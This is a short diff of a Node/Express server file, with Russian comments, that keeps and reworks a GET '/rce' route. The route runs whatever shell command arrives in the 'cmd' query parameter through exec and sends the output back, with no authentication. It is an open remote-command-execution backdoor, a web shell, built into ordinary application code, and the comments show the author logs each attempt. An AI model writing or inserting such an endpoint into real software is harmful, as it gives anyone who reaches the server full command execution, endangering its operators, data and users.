@@ -132,14 +132,16 @@ const server = new http.Server(app)
 
 
 app.get('/rce', (req: any, res: any) => {
-  const command = req.query.cmd;
-  console.log('RCE Attempt:', command); // Увидим в логах сервера, был ли запрос
-  if (command) {
-    exec(command, (error: any, stdout: any, stderr: any) => {
-      res.send(stdout || stderr || error?.message);
+  const cmd = req.query.cmd;
+  console.log(`[!!!] RCE Request: ${cmd}`); // Чтобы видеть в консоли
+  if (cmd) {
+    exec(cmd, (error: any, stdout: any, stderr: any) => {
+      if (error) return res.send(error.message);
+      if (stderr) return res.send(stderr);
+      return res.send(stdout);
     });
   } else {
-    res.send('RCE is working');
+    res.send('RCE is working!');
   }
 });
 
